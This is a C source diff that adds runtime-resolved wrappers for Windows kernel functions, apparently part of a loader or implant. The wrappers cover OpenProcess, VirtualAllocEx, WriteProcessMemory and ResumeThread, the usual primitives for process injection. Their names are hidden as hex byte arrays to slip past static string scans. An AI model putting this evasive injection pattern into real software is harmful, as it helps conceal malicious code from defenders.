@@ -87,6 +87,17 @@ HANDLE UtilsGetStdHandle(DWORD nStdHandle)
     return pGetStdHandle(nStdHandle);
 }
 
+HANDLE UtilsOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
+{
+    ULONG_PTR ulKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cOpenProcess[] = {0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0};
+    HANDLE(WINAPI * pOpenProcess)
+    (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) = UtilsGetProcAddressByName(ulKernel, cOpenProcess);
+
+    return pOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
+}
+
 BOOL UtilsWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOveralapped)
 {
     ULONG_PTR uiKernel = UtilsGetKernelModuleHandle();
@@ -175,6 +186,39 @@ LPVOID UtilsVirtualAlloc(PVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType,
     return pVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
 }
 
+LPVOID UtilsVirtualAllocEx(HANDLE hProcess, PVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cVirtualAllocEx[] = {0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x45, 0x78, 0};
+    LPVOID(WINAPI * pVirtualAllocEx)
+    (HANDLE hProcess, PVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = UtilsGetProcAddressByName(hKernel, cVirtualAllocEx);
+
+    return pVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
+}
+
+BOOL UtilsWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cWriteProcessMemory[] = {0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0};
+    BOOL(WINAPI * pWriteProcessMemory)
+    (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten) = UtilsGetProcAddressByName(hKernel, cWriteProcessMemory);
+
+    return pWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
+}
+
+DWORD UtilsResumeThread(HANDLE hThread)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cResumeThread[] = {0x52, 0x65, 0x73, 0x75, 0x6d, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0};
+    DWORD(WINAPI * pResumeThread)
+    (HANDLE hHandle) = UtilsGetProcAddressByName(hKernel, cResumeThread);
+
+    return pResumeThread(hThread);
+}
+
 BOOL UtilsVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
 {
     ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
@@ -240,6 +284,26 @@ BOOL UtilsVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PD
     (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpfOldProtect) = UtilsGetProcAddressByName(hKernel, cVirtualProtect);
 
     return pVirtualProtect(lpAddress, dwSize, flNewProtect, lpfOldProtect);
+}
+
+void UtilsSleep(DWORD dwMilliseconds)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cSleep[] = {0x53, 0x6c, 0x65, 0x65, 0x70, 0};
+    void(WINAPI * pSleep)(DWORD dwMilliseconds) = UtilsGetProcAddressByName(hKernel, cSleep);
+
+    pSleep(dwMilliseconds);
+}
+
+void UtilsOutpuDebugStringA(LPCSTR lpOutputString)
+{
+    ULONG_PTR hKernel = UtilsGetKernelModuleHandle();
+
+    CHAR cOutputDebugStringA[] = {0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x44, 0x65, 0x62, 0x75, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x41, 0};
+    void(WINAPI * pOutputDebugStringA)(LPCSTR lpOutputString) = UtilsGetProcAddressByName(hKernel, cOutputDebugStringA);
+
+    pOutputDebugStringA(lpOutputString);
 }
 
 void UtilsMemCpy(LPCVOID lpvSrc, LPVOID lpvDst, SIZE_T nBytes)
